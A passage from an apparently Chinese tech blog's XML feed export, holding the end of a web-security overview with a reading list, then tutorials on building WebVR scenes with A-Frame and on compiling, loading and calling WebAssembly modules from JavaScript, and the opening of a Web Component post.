清除足跡（Clearing Tracks）清除入侵的痕跡


總結以上整理一些 Web 常見資訊安全（Security）的議題和學習資源和讀者一起教學相長，成為一個好的白帽駭客（White Hat Hacker）。隨著網路科技的發展，資訊安全的議題只會越來越重要，當下次當有產品要上線到正式環境時，不妨使用 The Security Checklist 確認一下有哪些資安注意事項是我們沒有注意到的。
延伸閱讀
Web Security 網站安全基礎篇（一）
Web Security網站安全基礎篇（二）
3個免費的 Web資訊安全自動化測試工具
HITCON 2016 投影片 - Bug Bounty 獎金獵人甘苦談 那些年我回報過的漏洞
FallibleInc&#x2F;security-guide-for-developers
[資訊安全]防範Cross-Site-Scripting(XSS)
網站防範XSS攻擊的關鍵思考

關於作者：@kdchang 文藝型開發者，夢想是做出人們想用的產品和辦一所心目中理想的學校，目前專注在 Mobile 和 IoT 應用開發。A Starter &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover.:) 
]]></content>
      <tags>
        <tag>Web, Security</tag>
      </tags>
  </entry>
  <entry>
    <title>Web VR 初探</title>
    <url>/2017/04/01/web-vr-101/</url>
    <content><![CDATA[Web VR 出來也很久了，但沒有去玩過，因為想說我沒有相關設備，直到前陣子看到這篇文章 Minecraft in WebVR with HTML Using A-Frame
整個驚艷！
隨便加幾個 tag，然後調整一下就可以有 VR 效果，這東西不試試怎麼行！說不定以後能像這篇作者一樣，在自己的婚禮上搞一套 VR 的網站！因此決定跟著官網範例來了解一下 Web VR 到底該如何實作。
一樣先看個成品：
See the Pen webVR-test-demo5 by Arvin (@arvin0731) on CodePen.


A-frameA-Frame 是 Mozilla VR team 為了在 browser 上利用 Javascript 提供 VR 體驗的一套 web framework，官網 上有很詳細的教學與介紹。核心基於 HTML 與 entity-component-system framework (似乎是一套遊戲上常用的 pattern，像是 Unity)，雖然我不懂遊戲，但他的概念頗簡單，**”ECS favors composition over inheritance”**。
在每個場景（scene）中的每個物件（object）都是一個 entity，entity 可以想做一個物件的空殼，而該空殼的動作、行為、外觀皆是由 components 來完成。所以透過在場景中混搭組合各種 components 就能創造出無數種的物件，這種方式若是用繼承的方式則會需要 create 許多特殊的 class 才行。
在 A-frame 中，一個 entity 就是 &lt;a-entity&gt;&lt;/a-entity&gt;。
而這個 entity 可以掛載上各種 component，大致的方式如下：
AFRAME.registerComponent(&#x27;sun&#x27;, &#123;  schema: &#123;    degree: &#123;type: &#x27;number&#x27;&#125;,    color: &#123;type: &#x27;string&#x27;&#125;  &#125;,  init: function () &#123;    // Do something when component is plugged in.  &#125;,  update: function () &#123;    // Do something when component&#x27;s data is updated.  &#125;&#125;);

接著就能夠在 html 中使用 sun 這個 component，&lt;a-entity sun=&quot;degree: 5; color: yellow&quot;&gt;&lt;/a-entity&gt;。（這邊比較會跟一般的 html tag 混淆，因為 tag 上看似 attribute 的東西其實是 entity 掛載的 component。）
就像 Web component 一樣，A-frame 也有個 A-Frame Registry 在收集各種開發者貢獻的 component。
除了 &lt;a-entity&gt;&lt;/a-entity&gt; 以外，Web VR 還有許多原生原件，像是 &lt;a-scene&gt;、&lt;a-assets&gt;、&lt;a-box&gt; 等等。這些 Primitives 的 tag 也是一種 entity，主要是包含了一些複雜但是 common 的元件（像是 ，用來代表場景中的天空），以 &lt;a-box&gt; 為例，其實就是一個包含 geometry 與 material components 的 entity：
&lt;a-entity id=&quot;box&quot; geometry=&quot;primitive: box&quot; material=&quot;color: red&quot;&gt;&lt;/a-entity&gt;

也可以透過 AFRAME.registerPrimitive 的方式來註冊：
AFRAME.registerPrimitive(&#x27;a-wave&#x27;, &#123;  // Attaches the wave component by default.  // And smartly makes the wave parallel to the ground.  defaultComponents: &#123;    wave: &#123;&#125;,    rotation: &#123;x: -90, y: 0, z: 0&#125;  &#125;,  // Maps HTML attributes to wave component&#x27;s properties.  mappings: &#123;    width: &#x27;wave.width&#x27;,    depth: &#x27;wave.depth&#x27;,    density: &#x27;wave.density&#x27;,    color: &#x27;wave.color&#x27;,    opacity: &#x27;wave.opacity&#x27;  &#125;&#125;);

這樣就有一個 Primitives 元件可用，&lt;a-wave color=&quot;aqua&quot; depth=&quot;100&quot; width=&quot;100&quot;&gt;&lt;/a-wave&gt;
其中可以看到我們有 defaultComponents 與 mappings 兩個 properties 可以用，分別讓你設置這個 entity 的 default component 與 將 HTML 的 attribute 映射到你自定義的 component 的屬性中，向這邊就是將 html 的 width 映射到 wave 這個 component 的 width 屬性。
更詳細內容可以參考官網 primitives
Our first Web VR Scene (Skeleton)接下來從實作一個最簡單的 Web VR Scene 來一步步認識 Web VR 的一些基礎元件。
Web VR 的基礎骨幹：
&lt;html&gt;  &lt;head&gt;    &lt;script src=&quot;https://aframe.io/releases/0.5.0/aframe.min.js&quot;&gt;&lt;/script&gt;  &lt;/head&gt;  &lt;body&gt;    &lt;a-scene&gt;    &lt;/a-scene&gt;  &lt;body&gt;&lt;/html&gt;

&lt;a-scene&gt; 會 setup 一切 VR 所需的東西，並包含所有 entities，包含 WebGL, canvas, camera 等等，另外還有一些針對不同平台的 WebVR support，一個 out of box 的 magic tag！加上這個以後，整個 html 就會變成 WebVR 的骨幹了，你在 codepen 上的話就會看到右下角有個眼鏡的圖示。（當然記得要載入 aframe.js）
接著，我們需要瞭解一下在 A-frame 的世界中的座標系統，採用所謂的 right-hand rule

在 WebVR API 回傳的距離資料以 Meter 為單位，因此在 A-frame 中的距離單位也是 Meter，所以當你在設計你的 WebVR project 時要注意一下，height: 10 跟 width: 10 在一般開發 web 來說好像很小，但在 A-frame 中可是會超大。
Add Entity再來我們可以在 &lt;a-scene&gt; 中加入 &lt;a-cylinder color=&quot;red&quot;&gt;&lt;/a-cylinder&gt;
&lt;a-scene&gt;    &lt;a-cylinder color=&quot;red&quot;&gt;&lt;/a-cylinder&gt;&lt;/a-scene&gt;

當你放上去以後應該會覺得奇怪，怎麼什麼都看不到，轉動了一下才發現東西在你腳下ＸＤ原因很簡單，我們沒有設定 postion，所以 x, y, z 軸都是 0。根據 right-hand rule，我們可以給 position component 一些參數，另外還可以進行 rotation 與 scale：
&lt;a-scene&gt;    &lt;a-cylinder color=&quot;red&quot; position=&quot;0 2 -5&quot; rotation=&quot;30 45 45&quot; scale=&quot;1 1 1&quot;&gt;&lt;/a-cylinder&gt;&lt;/a-scene&gt;

如此應該就能看到如下結果：
See the Pen webVR-test-demo1 by Arvin (@arvin0731) on CodePen.


Note：這邊岔開介紹一下 codepen 上的 WebVR 功能，點選右下角眼鏡可以進入全 VR 環境，在電腦上 default 的控制是用滑鼠拖拉，或是 WASD 控制，如果你有 VR headset 就能更直接的體驗。
Add Background我們可以透過 &lt;a-sky&gt;&lt;/a-sky&gt; 來增加背景，裡面可以單純設置顏色、360度的影片或照片
&lt;a-sky src=&quot;http://i.imgur.com/JHZjdp6.jpg&quot;&gt;&lt;/a-sky&gt;

See the Pen webVR-test-demo2 by Arvin (@arvin0731) on CodePen.


這樣我們就有一個漂浮在城市空中的圓柱體了 XD  (圖片來源)
Asset Management System在 A-frame 裡面有個 &lt;a-assets&gt;，用來管理所有 Entity 的 assets 資源，與其直接寫在 inline 裡面在 runtime 時讀取，透過定義在 &lt;a-assets&gt; 中可以讓 Browser 更輕易地做 cache，而 A-frame 會保證在 render 之前就把這些資源都載好，因此官方建議使用這種方式來處理圖片等 assets。
用法很簡單，在 &lt;a-assets&gt; 中宣告 &lt;img&gt;，然後設定好 id，接著在想使用該 asset 的 entity 中的 src 指定對應 id 即可。
&lt;a-scene&gt;  &lt;a-assets&gt;    &lt;img id=&quot;skyTexture&quot; src=&quot;http://i.imgur.com/JHZjdp6.jpg&quot;&gt;  &lt;/a-assets&gt;  &lt;a-sky src=&quot;#skyTexture&quot;&gt;&lt;/a-sky&gt;&lt;/a-scene&gt;

More entity (Ground, Light, Animation)Ground &amp; Light基本的場景除了天空以外，當然還要有地板、燈光，地板其實有很多種選擇，可以用 &lt;a-plane&gt;，也能用 &lt;a-cylinder&gt;，只要設置對的高度跟方位即可。以 &lt;a-plane&gt; 來說，因為他 defalut 的角度是與 XY 平行，因此我們要將 X 軸反轉九十度，讓他與 XZ 平行：
&lt;a-plane src=&quot;#groundTexture&quot; rotation=&quot;-90 0 0&quot; width=&quot;30&quot; height=&quot;30&quot;&gt;&lt;/a-plane&gt;
另外場景中很重要的燈光，在目前的例子中，我們都沒有特別設定，A-frame 會自己幫我們定義一個 ambient light 和 directional light，一旦我們有了自己的設定，default 值就會被拔掉。
基本有兩種燈光可以設定：

ambient: 針對整個 scene 的燈光設定
point: 像是一個電燈泡，我們可以調整其位置與強度，讓 entity 上的光影效果因應距離與角度的不同有所變化。

&lt;a-light type=&quot;ambient&quot; color=&quot;#445451&quot;&gt;&lt;/a-light&gt;// intensity 為強度 2 距離在 x y z: 2 4 4 的燈泡&lt;a-light type=&quot;point&quot; intensity=&quot;2&quot; position=&quot;2 4 4&quot;&gt;&lt;/a-light&gt;

AnimationA-frame 有內建的 animation system，要使用很簡單，加上 &lt;a-animation&gt; 即可（文件上寫說這個 entity 將被取代，不過在我寫文的當下，該 issue 從 aframe 的 milestone 拔除了，所以還需要再觀察看看。）
&lt;a-cylinder color=&quot;red&quot; position=&quot;0 2 -5&quot; rotation=&quot;30 45 45&quot; scale=&quot;1 1 1&quot;&gt;     &lt;a-animation attribute=&quot;rotation&quot; to=&quot;30 60 45&quot; direction=&quot;alternate&quot; dur=&quot;2000&quot;        repeat=&quot;indefinite&quot;&gt;&lt;/a-animation&gt;&lt;/a-cylinder&gt;

是的，A-frame 中的 entity 可以有 child，而 child 會擁有 parent 設定的位置與角度等等，A-frame 會幫你處理好。
這邊我們的動畫讓  改變 rotation，到 30 60 45，也就是往 Y 軸轉動到 60 度，方向是 alternate，兩秒內做完，並且不斷 repeat。如果要多個動畫，就再加上一個 。
&lt;a-cylinder color=&quot;red&quot; position=&quot;0 2 -5&quot; rotation=&quot;30 45 45&quot; scale=&quot;1 1 1&quot;&gt;    &lt;a-animation attribute=&quot;rotation&quot; to=&quot;30 60 45&quot; direction=&quot;alternate&quot; dur=&quot;2000&quot;        repeat=&quot;indefinite&quot;&gt;&lt;/a-animation&gt;    &lt;a-animation attribute=&quot;position&quot; to=&quot;0 2.2 -5&quot; direction=&quot;alternate&quot; dur=&quot;2000&quot;        repeat=&quot;indefinite&quot;&gt;&lt;/a-animation&gt;&lt;/a-cylinder&gt;

現在我們的圓柱體會上下左右旋轉移動了！
See the Pen webVR-test-demo3 by Arvin (@arvin0731) on CodePen.


Add user interationVR 如果不能互動，還有什麼意義嗎？
雖然我們沒有 VR 設備，但 A-frame 有提供給 Desktop 的開發者一個好用的內建 component &lt;a-cursor&gt;，用來模擬 controllers，我們要讓 controller 固定在 camera 的中間，也就是跟著我們的眼睛，只要當作 child 放在  底下即可。(cursor 可以監聽的事件在此 https://aframe.io/docs/0.5.0/components/cursor.html)
&lt;a-camera&gt;    &lt;a-cursor&gt;&lt;/a-cursor&gt;&lt;/a-camera&gt;

如此一來我們就可以用滑鼠來做點擊的動作。
要讓場景中的物件跟隨我們的點擊有所反應的話，有兩種做法：

Event Listener Component:  如同一般我們在 Web 當中一樣，用 javascript 去 querySelector 出 object，接著加上 EventListener：
  &lt;script&gt;    const cylinderEl = document.querySelector(&#x27;a-cylinder&#x27;);    cylinderEl.addEventListener(&#x27;mouseenter&#x27;, function () &#123;        cylinderEl.setAttribute(&#x27;scale&#x27;, &#123;x: 2, y: 2, z: 2&#125;);    &#125;);&lt;/script&gt;
  也可以設置一個 component 然後 attach 到 Entity 上：  &lt;script&gt;    AFRAME.registerComponent(&#x27;scale-on-mouseenter&#x27;, &#123;        schema: &#123;            to: &#123;default: &#x27;2.5 2.5 2.5&#x27;&#125;        &#125;,        init: function () &#123;            var data = this.data;            // 在這邊設定 listener            this.el.addEventListener(&#x27;mouseenter&#x27;, function () &#123;                this.setAttribute(&#x27;scale&#x27;, data.to);            &#125;);            this.el.addEventListener(&#x27;mouseleave&#x27;, function () &#123;                this.setAttribute(&#x27;scale&#x27;, data.leave);            &#125;);        &#125;    &#125;);&lt;/script&gt;  &lt;!-- 掛載一個 sacle-on-mouseenter component 上去 --&gt;&lt;a-cylinder color=&quot;red&quot; position=&quot;0 2 -5&quot; rotation=&quot;30 100 0&quot; scale=&quot;1 1 1&quot; height=&quot;0.2&quot;    scale-on-mouseenter=&quot;to: 2.2 2.2 2.2&quot;&gt;    &lt;a-animation attribute=&quot;rotation&quot; to=&quot;30 90 90&quot; direction=&quot;alternate&quot; dur=&quot;2000&quot;    repeat=&quot;indefinite&quot;&gt;&lt;/a-animation&gt;    &lt;a-animation attribute=&quot;position&quot; to=&quot;0 2.2 -5&quot; direction=&quot;alternate&quot; dur=&quot;2000&quot;    repeat=&quot;indefinite&quot;&gt;&lt;/a-animation&gt;&lt;/a-cylinder&gt;

Animating on Event:  另一種方式很簡單，是直接設定 Event 到  上頭，但你就少了一些自由操作的彈性：  &lt;a-cylinder color=&quot;red&quot; position=&quot;0 2 -5&quot; rotation=&quot;30 100 0&quot; scale=&quot;1 1 1&quot; height=&quot;0.2&quot;    scale-on-mouseenter=&quot;to: 2.2 2.2 2.2&quot;&gt;    &lt;a-animation attribute=&quot;rotation&quot; to=&quot;30 90 90&quot; direction=&quot;alternate&quot; dur=&quot;2000&quot;    repeat=&quot;indefinite&quot;&gt;&lt;/a-animation&gt;    &lt;a-animation attribute=&quot;position&quot; to=&quot;0 2.2 -5&quot; direction=&quot;alternate&quot; dur=&quot;2000&quot;    repeat=&quot;indefinite&quot;&gt;&lt;/a-animation&gt;    &lt;a-animation attribute=&quot;scale&quot; begin=&quot;mouseenter&quot; dur=&quot;300&quot; to=&quot;2.2 2.2 2.2&quot;&gt;&lt;/a-animation&gt;    &lt;a-animation attribute=&quot;scale&quot; begin=&quot;mouseleave&quot; dur=&quot;300&quot; to=&quot;1 1 1&quot;&gt;&lt;/a-animation&gt;    &lt;a-animation attribute=&quot;rotation&quot; begin=&quot;click&quot; dur=&quot;2000&quot; to=&quot;30 405 0&quot;&gt;&lt;/a-animation&gt;&lt;/a-cylinder&gt;


中間的點（cursor）移入與移出圓柱體時會放大縮小，點擊時會旋轉：
See the Pen webVR-test-demo5 by Arvin (@arvin0731) on CodePen.


到目前為止學到的東西其實已經足夠我們回去最開始我提及的那篇文章 https://css-tricks.com/minecraft-webvr-html-using-frame/ 深入閱讀，大部分的內容在我這篇都有涵括到了，但透過閱讀該篇文章可以更了解如何利用 reusable 的 component 製作出一個 VR 的 Minecraft！並且裡面還有教你怎麼要設置 Vive, Oculus 的 controller，很推薦閱讀！
最後，再告訴大家一個好康，A-frame 有提供 Inspectorgithub！而且只要在你的 html 加上：
&lt;a-scene inspector=&quot;url: https://aframe.io/releases/0.3.0/aframe-inspector.min.js&quot;&gt;  &lt;!-- Scene... --&gt;&lt;/a-scene&gt;

接著按下 &lt;ctrl&gt; + &lt;alt&gt; + i，就可以看到如下畫面了！

A-frame 使用起來真的很簡單方便，大家都來玩玩看吧！
這邊有瀏覽器支援度：https://webvr.rocks/
資料來源
A-frame.io
Minecraft webVR using A-frame
Mozilla VR
webvr.rocks
Understanding Component-Entity-Systems

關於作者：@arvinh 前端攻城獅，熱愛數據分析和資訊視覺化
]]></content>
      <tags>
        <tag>webvr, A-frame</tag>
      </tags>
  </entry>
  <entry>
    <title>了解 WebAssembly 的基礎使用方法</title>
    <url>/2017/06/17/webassembly-js-future/</url>
    <content><![CDATA[前言時間過得很快，記得第一次聽到 WebAssembly 這個名詞是在 2015 年，小弟還在服役…當時看到的文章以聳動的標題訴說著 JavaScript 即將要被取代，各家大廠紛紛投入開發…（我就不轉貼這種文章了）害我想說是不是退役後會找不到工作…
還好記者說的總是不一定對，WebAssembly 當然不是來取代 JavaScript 的，可以看看 JavaScript 的發明人 Brendan Eich 怎麼說 以及 他在 Fluent conference 的 keynote。
但即便知道 WebAssembly 並非要取代 JavaScript，我其實也還是一直搞不太懂身為開發者，到底要如何使用 WebAssembly，只知道它似乎讓 C&#x2F;C++ 跑在 Browser 上這件事變成可行，也能大幅提升 JavaScript 的效能。
直到前陣子發現一部限時免費的教學影片 - Get Started Using WebAssembly (wasm)，我才稍稍領悟了一些。這部由 Guy Bedford 製作的影片在 egghead.io 上，短短 56 分鐘，以實際範例告訴你如何使用 WebAssembly，以及與 JS 進行效能比較，也介紹了許多方便你測試的工具，有時間的話我強烈推薦把它看完，不過現在已經要是 egghead 的 pro member 才能看得到了… (作者有 open source 他所有的範例 code 在 guybedford&#x2F;wasm-intro 與 guybedford&#x2F;wasm-demo)
可能你沒有時間也沒有多餘的錢能付費觀看，但沒關係，希望憑著我的記憶，透過這篇文章融合一些影片的重點，讓大家快速了解 WebAssembly 是什麼，以及要如何與 JavaScript 搭配使用。
什麼是 WebAssembly (wasm)？
WebAssembly or wasm is a new, portable, size- and load-time-efficient format suitable for compilation to the web. – WebAssembly Design


一種二進位表示的新語言，但有另外的 text format 可以讓你編輯與 debug。

Compile Target：顧名思義，只要透過特定的 Compiler，你就能將你自己慣用的語言編譯成 WebAssembly，然後執行在瀏覽器上！目前可以透過 Emscripten(LLVM to JS compiler) 來編譯 C&#x2F;C++ 的程式。

提供增強 JavaScript 程式的方法：你可以將 performance critical 的程式部分用 WebAssembly 撰寫，或是用第 2 點提及的 C&#x2F;C++編譯成 WebAssembly，然後像一般 import js module 一般，導入你的 JavaScript Application。透過 WebAssembly，你能夠自由控制 Memory 的存取與釋放。

當 Browser 能夠支援運行 WebAssembly 的時候，由於二進位格式以及事先編譯與優化的關係，勢必能夠產生比 JavaScript 運行速度更快、檔案大小更小的結果。

語言的安全性 WebAssembly 當然也很重視，在 JavaScript VM 中， WebAssembly 運行在一個沙箱化的執行環境，遷入 web 端運行時會強制使用 Browser 的 Same-Origin 和 permissions security policies。此外，wasm 的實作設計中更特別提及他是 memory-safe 的。

Non-Web Embeddings：雖然是為了 Web 設計，但也希望能在其他環境中運行，因此底層實作並沒有 require Web API，讓其擁有良好的 portability，不管是 Nodejs, IoT devices 都可使用。


WebAssembly 目前由 W3C Community Group 設計開發，成員包含所有 major browsers 的代表。
WebAssembly 有許多 High-Level Goals，目前 release 的版本主要為 MVP(Minimum Viable Product)，提供先前 asm.js 的多數功能，並先以 C&#x2F;C++ 的編譯為主。
等等，第一點就有問題了，你說他是二進位表示的語言，那該怎麼寫？！text format 又是長什麼樣子？問得好，這就是本篇的重點，WebAssembly 的檔案格式為 wasm，舉一個例子來看，一個用 c++ 撰寫的加法函數：
add.c#include &lt;math.h&gt;int add(int num1, int num2) &#123;    return num1 + num2;&#125;


若編譯為 wasm 會長這個樣子（為節省空間我轉成 Hex）：
add.wasm00 61 73 6d 01 00 00 00  01 87 80 80 80 00 01 6002 7f 7f 01 7f 03 82 80  80 80 00 01 00 04 84 8080 80 00 01 70 00 00 05  83 80 80 80 00 01 00 0106 81 80 80 80 00 00 07  95 80 80 80 00 02 06 6d65 6d 6f 72 79 02 00 08  5f 5a 33 61 64 64 69 6900 00 0a 8d 80 80 80 00  01 87 80 80 80 00 00 2001 20 00 6a 0b

當然我們很難去編輯這樣的東西，所以有另一種 text format 叫做 wast，上述的 .wasm 轉成 .wast 後：
add.wast(module  (table 0 anyfunc)  (memory $0 1)  (export &quot;memory&quot; (memory $0))  (export &quot;add&quot; (func $add))  (func $add (param $0 i32) (param $1 i32) (result i32)    (i32.add      (get_local $1)      (get_local $0)    )  ))

這樣就好懂多了，我們一行一行來解釋：
line 1 的 module 就是 WebAssembly 中一個可載入、可執行的最小單位程式，在 runtime 載入後可以產生 Instance 來執行，而這個 module 也朝著與 ES6 modules 整合的方向，也就是說以後能透過 &lt;script src=&quot;abc.wasm&quot; type=&quot;module&quot; /&gt; 的方式載入。
line 2 ~ 3 分別宣告了兩個預設的環境變量: memory 與 table，memory 就是存放變數的記憶體物件，而 table 則是 WebAssembly 用來存放 function reference 的地方，在目前 MVP 的版本中，table 的 element type 只能為 anyfunc。
接著 line 4 ~ 5 把 memory 與 add function export 出去。之後在 JavaScript 中，我們可以取得這兩個被 export 出來的物件與函式。
最後是加法函式的宣告與實作內容，其中 get_local 是 WebAssembly 中取得 memory 中 local 變數的方法。
不知道會不會有人好奇 i32 是什麼？
i32 指的就是 32位元的整數，在 WebAssembly 的世界中，是強型態的，必須明確指定變數型態，寫習慣 JS 的要多加注意。

那到底怎麼將 C&#x2F;C++ 編譯成 wasm 或 wast 呢？WebAssembly.org 中介紹我們使用 Emscripten，Emscripten 的安裝與使用方法大家可以從官網上看到，就不贅述。
安裝好後執行 emcc add.c -s WASM=1 -o add.html 即可，唯一要注意的是 WASM=1 這個 flag 要設定，否則 emcc 預設會跑 asm.js。
如果只是想嚐鮮一下，可能看到要安裝這些東西就會把網頁關掉了…
不過不用擔心！現在也已經有很方便的 online tool 可以使用：
WasmFiddle


WasmFiddle 可以幫你把 C code 轉成 Wast 與 Wasm (可下載)，然後同時讓你直接利用 JS 進行操作，缺點是沒辦法直接更改 Wast。
WasmExplorer：


WasmExplorer 一樣能幫你把 C code 編譯成 Wast 與 Wasm，並且可以編輯轉出來的 Wast，缺點是沒有 JS 能直接互動。
所以搭配操作的流程…
先 WasmFiddle 來進行測試，接著把編好的 Wast 複製到 WasmExplorer 進行你想要的編輯，接著再 compile 成 wasm 並下載下來。



知道怎麼編譯 wasm 後，該說說 JavaScript 了吧好的，但在那之前，要先提醒大家，除了 Chrome 57, Firefox 52 預設支援 WebAssembly 外，Safari 需要是紫色版本（Preview 版）才能使用，而 Edge 15 則是要開啟 Experimental JavaScript Features。
載入 wasm 到 Web 端在 &lt;script src=&quot;abc.wasm&quot; type=&quot;module&quot; /&gt; 還無法使用之前，想要載入 wasm 必須透過 fetch API。在 Guy bedford 的影片範例 與 mdn 的 example 中的寫法都差不多：
wasm-loader.jsfunction fetchAndInstantiateWasm (url, imports) &#123;    return fetch(url) // url could be your .wasm file    .then(res =&gt; &#123;    if (res.ok)        return res.arrayBuffer();    throw new Error(`Unable to fetch Web Assembly file $&#123;url&#125;.`);    &#125;)    .then(bytes =&gt; WebAssembly.compile(bytes))    .then(module =&gt; WebAssembly.instantiate(module, imports || &#123;&#125;))    .then(instance =&gt; instance.exports);&#125;

基本上會實作一個 wasm-loader 之類的函式，像上面的 fetchAndInstantiateWasm。
內容很簡單，取得 fetch 回來的 result 後，將其轉為 ArrayBuffer，利用 WebAssembly.compile 這個 Web API 來產生 WebAssembly Module，接著透過 WebAssembly.instantiate 來產生 module instance，最後的 instance.exports 就是我們在 wasm 中 export 出來的物件或 function。
除了 fetch 以外，WebAssembly.compile 與 WebAssembly.instantiate 也都是回傳 Promise。
這邊出現一個相信一般前端開發者也比較少看到的 ArrayBuffer。
ArrayBuffer 是 JavaScript 的一種 data type，用來表示 generic, fixed-length 的 binary data buffer，屬於 typed arrays 的一部分，而關於 typed arrays 雖然在 WebAssembly 中很重要，但是難以在這邊詳述，mdn 的文件寫得很清楚，值得閱讀。
我們目前只要知道他是一個 array-like 的物件，讓我們能在 JavaScript 中存取 raw binary data，有 Int8Array、Int32Array 與 Float32Array 等 DataView 可以使用即可。（又一個名詞…DataView 提供 getter&#x2F;setter API 來對 buffer 中的 data 做讀取。）
回到主題，如果你剛剛有先點進 mdn 的 example 看，可能會發現他怎麼沒有 WebAssembly.compile 這個步驟？
實際上 WebAssembly.instantiate 有兩種 overload 實作：

Promise&lt;ResultObject&gt; WebAssembly.instantiate(bufferSource, importObject);
Promise&lt;WebAssembly.Instance&gt; WebAssembly.instantiate(module, importObject);

差別在於，先透過 WebAssembly.compile 後產生的 WebAssembly module，可以存在 indexedDB 中 cache，或是在 web workers 之間傳遞。
此外，WebAssembly.Instance 的第二個參數：importObject 是用來傳遞 JavaScript 的參數或 function 到 WebAssembly 程式中使用，後面會有範例。 
在 JavaScript 中使用 WebAssembly 實作的 function有了剛剛的 fetchAndInstantiateWasm，取得 WebAssembly function 很方便：
fetchAndInstantiateWasm(&#x27;add.wasm&#x27;, &#123;&#125;)    .then(m =&gt; &#123;      console.log(m.add(5, 10)); // 15    &#125;);

使用上就是這麼簡單！
那能不能在 WebAssembly 中使用 JavaScript 寫的 function 呢？當然可以！就是透過方才所說的第二個參數 importObject。
假設我們想要在剛剛的加法函數內進行 JS 的 console.log：
add.c#include &lt;math.h&gt;void consoleLog (int num);int add(int num1, int num2) &#123;    int result = num1 + num2;    consoleLog(result);    return result;&#125;

先宣告一個 consoleLog 函式，並不需要實作他，因為這會是我們待會要從 JavaScript 那邊 import 進來的部分：
fetchAndInstantiateWasm(&#x27;./add.wasm&#x27;, &#123;    env: &#123;        consoleLog: num =&gt; console.log(num)    &#125;&#125;).then(m =&gt; &#123;    m.add(5, 3) // console.log 8&#125;);

在剛剛的 fetchAndInstantiateWasm 的第二個參數中，我們定義一個 env object，並傳入一個內含 console.log 的函式。env 是一個特殊的 key，在剛剛的 add.c 當中，我們宣告的 void consoleLog (int num) 轉換到 add.wast 時，他會當作這個函式是從 env 中 import 進入的（line 2）：
add.wast(module  (type $FUNCSIG$vi (func (param i32)))  (import &quot;env&quot; &quot;consoleLog&quot; (func $consoleLog (param i32)))  // ...函數內容省略，可參考前面的範例)

難道只能從 env 載入嗎？當然不是，我們也可以自己定義，但就要去更改 wast 檔案了，其實改過以後會發現邏輯不難懂，有讓我回味到大學修組語的感覺…
add-10-20.wast(module  (type $FUNCSIG$vi (func (param i32)))  (import &quot;env&quot; &quot;consoleLog&quot; (func $consoleLog (param i32)))  ++(import &quot;lib&quot; &quot;log&quot; (func $log (param i32)))  (table 0 anyfunc)  (memory $0 1)  (export &quot;memory&quot; (memory $0))  (export &quot;add&quot; (func $add))  (func $add (param $0 i32) (param $1 i32) (result i32)    (call $consoleLog // 從 env 中載入的 consoleLog      ++(i32.add        (tee_local $1          (i32.add            (get_local $1)            (get_local $0)          )        )        ++(i32.const 20) // 從 env 載入的 consoleLog 多加 20      )    )    ++(call $log // 從我們自己定義的 lib 中載入的 log      ++(i32.add        ++(get_local $1)        ++(i32.const 10) // 從 env 載入的 consoleLog 多加 10      ++)    ++)    (get_local $1)  ))

前面有加號的就是我們直接在 wast 中修改的程式碼，等同於如下 C 語言的程式：
add.c#include &lt;math.h&gt;void consoleLog (int num);int add(int num1, int num2) &#123;    int result = num1 + num2;    consoleLog(result + 20);    log(result + 10); // 多了這個從 lib 匯入的 log 函數    return result;&#125;


如此一來，我們就能夠像下面這般傳遞 lib.log 給我們的 wasm 使用了！
WASM Test on jsbin.com

現在我知道如何在 JS 與 WebAssembly 中互相使用函式了，但前面好像有提到他還能讓你操作 Memory?!前面範例中的 wast 都有將 memory export 出來：(export &quot;memory&quot; (memory $0))我們可以利用前面提及的 JavaScript Typed Array 來取得 memory buffer，並利用 TextDecoder 這個較新的 Web API 來解碼：
const memory = wasmModule.memory;const strBuf = new Uint8Array(memory.buffer, wasmModule.getStrOffset(), 11);const str = new TextDecoder().decode(strBuf);console.log(str);

JS Bin on jsbin.com
可以讀取到 memory，當然也能寫入：
function writeString (str, offset) &#123;      const strBuf = new TextEncoder().encode(str);      const outBuf = new Uint8Array(mem.buffer, offset, strBuf.length);      for (let i = 0; i &lt; strBuf.length; i++) &#123;        outBuf[i] = strBuf[i];      &#125;    &#125;

對於 Memory 的操作部分，Guy Bedford 的範例有更多介紹，包含怎麼搭配 malloc 來動態調整記憶體。


WebAssembly 對於效能的展現似乎到目前為止都沒有觸及耶？要能夠展現 JavaScript 與 WebAssembly 的效能差異其實沒有那麼簡單，Guy Bedford 在影片中的範例是在螢幕上畫出多個圓圈，計算他們之間碰撞的狀況來移動，有趣的是，第一次的 Demo 中，JavaScript 的速度比 WebAssembly 實作碰撞計算的要快得多，然而在重新 optimize 演算法後，才讓 WebAssembly 的效能有大幅進展，比起 JavaScript 好上不少（同樣演算法）
這邊放個動態截圖給大家看，想自己跑跑看或是看程式碼的可以移駕 Guy Bedford 的 repo - Wasm Demo，載下來直接就能打開 html 執行囉！(要執行這個 Demo 需要 Chrome Canary 並在 chrome:&#x2F;&#x2F;flags 中啟動 Experimental Web Platform Flag)


結論目前 wasm 在 Chrome 與 firefox 都已實作，雖然一定還會有規格上的變更，但了解一下這個勢必會影響未來 Web 開發的東西是有必要的！
本文也只是簡單介紹基礎的使用方法，實際上還有許多相關的議題，像是 Type Arrays 與 WebAssembly Web API 等等，都需要有所了解。甚至是如何將各種程式語言 compile 成 wasm 也是一門大學問，也有許多我沒有提及的工具可以使用（從資料來源中找得到）。
希望大家看完後可以對 WebAssembly 的使用方式有點概念，文中若有不清楚或是錯誤的地方也歡迎指正！
資料來源
WebAssembly.org
Get Started Using WebAssembly (wasm)
WebAssembly Design
W3C Community Group
WebAssembly 系列（四）WebAssembly 工作原理
guybedford&#x2F;wasm-intro
guybedford&#x2F;wasm-demo)

關於作者：@arvinh 前端攻城獅，熱愛數據分析和資訊視覺化
]]></content>
      <tags>
        <tag>Web, WASM, JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>Web Component 實戰</title>
    <url>/2017/03/04/webcomopnent-practice/</url>
    <content><![CDATA[前言上個月我們介紹過 Web Component，大致上把 Web Component 的相關知識都介紹一輪了，也提供了一些範例，但是並沒有製作出一個完整可用的元件，因此今天就好好的來實做一個簡易又實用的 Web Component（對我來說很實用啦…），並且將他發佈到 Webcomponent.org 上面。最後也會說明一下我嘗試將我製作的 webcomponent 與 react 整合的心得。
開始前還是先給大家看一下看完這篇文章後可以達到的成果，發佈到 Webcomponent.org 並有 inline demo：

format-num webcomponentrepo
